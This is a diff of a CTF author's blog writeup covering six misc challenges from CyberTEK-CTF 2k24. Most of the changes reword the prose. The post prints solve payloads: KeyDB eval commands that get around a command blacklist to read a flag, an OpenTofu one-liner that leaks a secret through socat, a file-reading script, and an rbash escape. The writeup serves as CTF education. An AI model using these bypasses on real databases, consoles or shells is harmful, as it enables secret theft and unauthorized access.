@@ -2,15 +2,13 @@
 title: "CyberTEK-CTF 2k24"
 date: 2024-05-05
 draft: false
-description: "a description"
+description: "Writeup for the misc challenges I authored at CyberTEK-CTF 2k24: KeyDB command smuggling, OpenTofu secret exfiltration, a git-object forensics puzzle, an rbash escape, and a corrupted image fix hidden in deleted docker layers."
 tags: ["ctf", "misc"]
 aliases: ["/writeups/CyberTEK-CTF-2k24/"]
 ---
 
 ### Intro;
-Last weekend, we had the privilege of organizing a local CTF competition at TEKUP University. The competition featured +30 custom-authored challenges spanning diverse categories. 
-The event saw an amazing turnout with 50+ teams and 140+ players joining in. The feedback was incredibly positive, with many participants enjoying the challenges and the overall experience.
-
+Last weekend we ran a local CTF at TEKUP University: 30+ custom-authored challenges, 50+ teams, 140+ players. The feedback afterward was good. People actually enjoyed the challenges, which isn't a given.
 
 ### About;
   - Event place: TEKUP University. 
@@ -18,7 +16,7 @@ The event saw an amazing turnout with 50+ teams and 140+ players joining in. The
   - Flag format: Securinets{.*}.
 
 ### Challenges;
-The CTF showcased a wide variety of challenges across multiple categories, and I had the privilege to author 6 challenges for the Misc category although most of them are jail-oriented tasks. Below is a detailed breakdown of the challenges and their difficulty levels:
+I authored six of the Misc challenges, most of them jail-oriented. Here's the breakdown:
 
 |   Challenge     | Points | Solves |  Author |
 |-----------------|--------|--------|---------|
@@ -29,17 +27,16 @@ The CTF showcased a wide variety of challenges across multiple categories, and I
 |   [heimerdigger]()  |  146   |   18   | xhlayel, chxmxii |
 
 #### Siclodb;
-This challenge was a bit tricky. I blacklisted several KeyDB functions to prevent players from directly retrieving the value of the flag key. The twist was that many participants were unaware they could use eval() in the KeyDB console or leverage redis.call() as an alternative to KeyDB.call() (since keydb is a fork of redis) to bypass the restrictions. However the final payload should look like that;
+This one was tricky by design. I blacklisted several KeyDB functions so players couldn't pull the flag key directly. The twist: most people didn't realize you could still run `eval()` in the KeyDB console, or fall back to `redis.call()` instead of `KeyDB.call()`. KeyDB is a Redis fork, so the old Redis commands still work under the hood. The winning payload looked like this:
 ```shell
 $ eval "local a='du'; a=a..'mp';local b='fl';b=b..'ag'; local k=redis.call(a, b); return k;" 0
 $ eval "local a='ge'; a=a..'t';local b='fl';b=b..'ag'; return cjson.encode(redis.call(a, b))" 0
 ```
 ---
 #### Openheimer;
-In case you're unfamiliar, OpenTofu is a community-driven fork of the popular Infrastructure-as-Code tool Terraform, created after some licensing changes caused controversy. To introduce OpenTofu to the community, I designed this challenge, which allows players to connect to an OpenTofu console.
+Quick context if you haven't run into it: OpenTofu is a community fork of Terraform, born out of a licensing dispute that split the IaC world in two. I built this challenge to put it in front of people. Players connect to a live OpenTofu console and have to figure out how to leak the secrets.
 
-The objective is for players to figure out how to list the OpenTofu secrets. There are several ways to solve this, and one possible solution is shown below:
-
+One way in:
 ```shell
 nonsensitive(urlencode(var.SECRET)) | socat - TCP:localhost:13337
 ```
@@ -50,7 +47,7 @@ https://opentofu.org/docs/language/functions/nonsensitive/
 
 ---
 #### Ekko;
-The challenge present two API endpoints, one for listing directories and another for reading file contents. This inspired the challenge's description, ls && cat made easy. Without diving too deep into the specifics, you can find the solution for this challenge below:
+Two API endpoints: one lists directories, one reads files. Hence the description: "ls && cat made easy." Here's the solve:
 ```python
 from os import listdir, path
 import requests, re, zlib\
@@ -84,8 +81,7 @@ for blob in listdir("."):
 
 ---
 #### Bolbok
-In this challenge, players were placed in a restricted shell environment, `rbash`, with limited command options. The flag was hidden in a directory with an ambiguous name, making it tricky to locate. However, for those familiar with `ls` and `grep`, the solution was straightforward:
-
+Players landed in a restricted `rbash` shell with a short list of allowed commands, and the flag sat in a directory with a name designed to blend in. Anyone comfortable with `ls` and `grep` could still find it fast:
 ```shell
 ls -Ra / | grep flag -B3
 <path>:
@@ -93,7 +89,7 @@ ls -Ra / | grep flag -B3
 ..
 .flag
 ```
-Players had to figure out how to read its contents within the restricted shell.
+Reading it inside a restricted shell was the actual puzzle:
 ```shell
 echo $(< <path>/.flag)
 Securinets{FLAG}
@@ -104,8 +100,7 @@ Securinets{FLAG}
 
 ---
 #### Heimerdigger;
-dive into the docker layers and collect the deleted files.
-one of the files gave us a hint about fixing the corrupted jpg file `f(byte) = (15 - byte) modulos 256`
+The task: dig through Docker layers and recover the deleted files. One of them hinted at how to fix a corrupted JPG: `f(byte) = (15 - byte) modulos 256`.
 
 ```python
 def transform_file(input_image_path, output_image_path):
@@ -124,7 +119,6 @@ transform_file(input_image_path, output_image_path)
 ---
 ### Das Ende;
 
-A huge shoutout to everyone who helped make this event a success-Securitnets TEKUP, the participants, and the support from TEKUP University.
-For more insights, detailed write-ups, or to access the challenge files, check out my GitHub repository: 
+Thanks to everyone who made the event happen: Securinets TEKUP, the participants, and TEKUP University for hosting. Challenge files and more writeups live in my GitHub repo:
 
 {{< github repo="chxmxii/CTF" >}}
